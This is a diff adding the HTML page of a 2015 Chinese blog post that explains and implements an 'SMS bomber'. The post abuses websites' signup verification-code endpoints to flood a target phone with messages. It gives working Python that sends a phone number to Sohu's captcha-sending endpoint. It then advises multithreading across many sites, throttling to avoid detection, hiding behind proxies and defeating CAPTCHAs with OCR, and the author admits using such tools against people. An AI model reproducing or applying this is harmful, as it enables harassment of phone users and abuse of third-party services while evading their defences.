@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Python,Others," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="很多情况下，我们会遇到一些讨厌的人，特别是那种电信诈骗的骗子，行骗方法歹毒低劣，十分令人恶心。然而我们又不能拿他们怎么办。这时候我们就会想起用电话轰炸机这个东西来打击报复。网络上也有过类似的比如“短信轰炸机”这种东西，我也用他来黑过一些人。据他们后来说他们收到的都是些注册会员啊，登陆啊之类的短信提示，十分的烦人。当时听上去就觉得这个东西真的很厉害。最近一个偶然的机会，我发现其实短信轰炸机这种东西原">
+<meta property="og:type" content="article">
+<meta property="og:title" content="短信轰炸机原理分析及简要实现">
+<meta property="og:url" content="https://www.resonanat.com/2015/11/27/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%9C%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E7%AE%80%E8%A6%81%E5%AE%9E%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Resive world">
+<meta property="og:description" content="很多情况下，我们会遇到一些讨厌的人，特别是那种电信诈骗的骗子，行骗方法歹毒低劣，十分令人恶心。然而我们又不能拿他们怎么办。这时候我们就会想起用电话轰炸机这个东西来打击报复。网络上也有过类似的比如“短信轰炸机”这种东西，我也用他来黑过一些人。据他们后来说他们收到的都是些注册会员啊，登陆啊之类的短信提示，十分的烦人。当时听上去就觉得这个东西真的很厉害。最近一个偶然的机会，我发现其实短信轰炸机这种东西原">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2015-11-27T15:53:12.000Z">
+<meta property="article:modified_time" content="2024-01-22T01:54:03.097Z">
+<meta property="article:author" content="Companyd">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Others">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.resonanat.com/2015/11/27/短信轰炸机原理分析及简要实现/"/>
+
+
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4636539228226058"
+     crossorigin="anonymous"></script>
+
+
+  <title>短信轰炸机原理分析及简要实现 | Resive world</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Resive world</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Come world to Record life</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.resonanat.com/2015/11/27/%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%9C%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E7%AE%80%E8%A6%81%E5%AE%9E%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Resive world">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">短信轰炸机原理分析及简要实现</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-11-27T23:53:12+08:00">
+                2015-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Others/" itemprop="url" rel="index">
+                    <span itemprop="name">Others</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>很多情况下，我们会遇到一些讨厌的人，特别是那种电信诈骗的骗子，行骗方法歹毒低劣，十分令人恶心。然而我们又不能拿他们怎么办。这时候我们就会想起用电话轰炸机这个东西来打击报复。网络上也有过类似的比如“短信轰炸机”这种东西，我也用他来黑过一些人。据他们后来说他们收到的都是些注册会员啊，登陆啊之类的短信提示，十分的烦人。当时听上去就觉得这个东西真的很厉害。最近一个偶然的机会，我发现其实短信轰炸机这种东西原理也是十分的简单的，只要拥有一些基础的网页登陆的知识，理论上就可以实现写出自己的“短信轰炸机”。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在我们注册一家网站的会员的时候，很多情况下我们需要输入我们的手机号来进行识别和绑定。通常的步骤是：(1)我们输入手机号;(2)系统会向我们的手机发送一条验证码;(3)我们将手机上收到的验证码输入到注册页面上来完成识别。明眼人一看大概就能看出其中的端倪。没错，我们就可以利用网站发送的验证短信，来作为我们的”轰炸引擎“。</p>
+<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><p>步骤就是模拟登陆的步骤了，首先我们手动实现一次验证，并且用抓包工具截获他的http封包，获得post的数据，然后利用现有的编程工具，模拟请求即可。</p>
+<h2 id="python简单实现"><a href="#python简单实现" class="headerlink" title="python简单实现"></a>python简单实现</h2><p>我模拟的是搜狐的注册申请，仅实现一次发送。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib,urllib2,cookielib</span><br><span class="line">path=<span class="string">&#x27;https://passport.sohu.com/signup/send_mobile_captcha&#x27;</span></span><br><span class="line">number=<span class="string">&quot;18282828282&quot;</span></span><br><span class="line">cj=cookielib.CookieJar()</span><br><span class="line">post_data=urllib.urlencode(&#123;<span class="string">&#x27;mobile&#x27;</span>:number,<span class="string">&#x27;captchaType&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">opener.addheaders=[(<span class="string">&#x27;User-agent&#x27;</span>,<span class="string">&#x27;Opera/9.23&#x27;</span>)]</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">req=urllib2.Request(path,post_data)</span><br><span class="line">response=urllib2.urlopen(req)</span><br><span class="line"><span class="built_in">print</span> response.read()</span><br></pre></td></tr></table></figure>
+<p>其中的post的数据是根据抓包抓来的数据来填写的，其他的就是简单的模拟登陆的东西。</p>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><ol>
+<li>实际应用中，需要使用多线程的技术申请多个网站来保证轰炸的密度。</li>
+<li>申请的频率不能太快，因为服务器端会有记录，申请太快会被拒绝服务的。</li>
+<li>通常会使用proxy代理http服务来隐藏自身信息。</li>
+<li>为了防止被利用，绝大多数的网站都会在申请时设置验证码环节来抵御我们这种恶意的申请。所以通常还需要结合OCR技术来识别验证码。</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/Others/" rel="tag"># Others</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/11/25/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%802-2/" rel="next" title="正则表达式基础（2）">
+                <i class="fa fa-chevron-left"></i> 正则表达式基础（2）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/11/30/MD5%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8/" rel="prev" title="MD5算法应用">
+                MD5算法应用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">502</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">251</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">基本步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">python简单实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note"><span class="nav-number">4.</span> <span class="nav-text">note</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Companyd</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
